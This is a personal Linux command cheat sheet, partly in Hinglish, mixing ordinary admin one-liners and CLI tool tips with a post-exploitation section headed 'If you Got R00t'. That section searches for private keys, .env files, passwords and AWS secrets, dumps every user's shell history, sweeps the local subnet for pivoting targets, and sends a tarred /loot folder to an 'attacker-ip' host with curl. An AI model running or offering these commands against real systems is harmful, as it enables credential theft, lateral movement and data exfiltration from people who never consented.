### Watch changes in a folder live

```sh
watch -n 1 ls -lt
```

### Monitor network connections
```
netstat -tulnp
```

### Find your public IP
```
curl ifconfig.me

```

### Super System Status One-Liner (No htop)
```sh
echo "=== CPU INFO ==="; lscpu | grep -E 'Model name|CPU\(s\)|MHz'; \
echo -e "\n=== MEMORY ==="; free -h; \
echo -e "\n=== DISK USAGE ==="; df -h --total | grep -E 'Filesystem|total'; \
echo -e "\n=== TOP PROCESSES BY CPU ==="; ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -10; \
echo -e "\n=== TOP PROCESSES BY MEM ==="; ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head -10; \
echo -e "\n=== NETWORK ==="; ss -tulwn
```

```
uname -a; id; whoami; hostname; echo "Groups:"; groups; cat /etc/os-release

#All users with login shells
awk -F: '$7 !~ /nologin|false/ {print $1}' /etc/passwd


#All sudoers & their privileges
grep -E '^%?sudo' /etc/group; getent passwd | grep -E 'sudo'
sudo -l

```

- If you Got R00t:
```sh
#Find readable sensitive files
find / -type f \( -name "*.conf" -o -name "*.key" -o -name "*.pem" -o -name "*.env" \) -readable 2>/dev/null

#Search for passwords in config files
grep -riE 'pass(word)?\s*=\s*' /etc /home 2>/dev/null

#Hunt for AWS creds
grep -r "AWS_SECRET_ACCESS_KEY" /home 2>/dev/null


#List all recent shell history
for u in $(cut -d: -f1 /etc/passwd); do [ -f /home/$u/.bash_history ] && echo "=== $u ===" && cat /home/$u/.bash_history; done

List all listening ports with processes
ss -tulpn

Find internal services for pivoting
netstat -tulnp | grep LISTEN

Check other hosts in local subnet
for ip in $(seq 1 254); do ping -c 1 -W 1 192.168.0.$ip &>/dev/null && echo "Alive: 192.168.0.$ip"; done


Jo dundhaa leke bhaaago :
tar czf - /loot | curl -X POST --data-binary @- http://attacker-ip/upload

```



# Tips 

alias use kerke inn commands ko apne system me badal do inse.
and inn commands ka theek se use kerna bheee seekh ke apne notes update kerlo.!!! bCOZ tHESE NE COMMANDS ARE bAAP OF pURANE.


ls --> eza
cat --> bat
find --> fd
grep --> rg(ripgrep)
man --> tldr
ineterctive tree nevigation --> broot 
curl--> httpie, xh ( isme doino rakho  toh better hoga) 
`ps aux` --> procs
Terminal me Markdown viewer --> glow 
Disk analyzer ka CLI beast --> dua-cli
htop --> btop
sed --> sd
cd --> zoxide
wget --> aria2c ( for downloading )


```sh
#Update System OneLiner
if [ -f /etc/debian_version ]; then sudo apt update && sudo apt full-upgrade -y; 
elif [ -f /etc/arch-release ]; then sudo pacman -Syu --noconfirm; 
elif [ -f /etc/fedora-release ]; then sudo dnf upgrade -y; fi




```




